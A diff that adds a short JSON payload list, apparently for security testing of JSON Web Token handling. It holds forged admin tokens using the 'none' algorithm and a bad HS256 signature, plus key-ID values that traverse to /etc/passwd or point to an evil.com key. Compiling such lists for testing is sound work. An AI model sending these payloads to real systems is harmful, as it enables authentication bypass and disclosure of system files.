@@ -1,0 +1,10 @@
+{
+  "jwt": [
+    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.x"
+  ],
+  "jwt_kid": [
+    "../../../../etc/passwd",
+    "http://evil.com/key.pem"
+  ]
+}
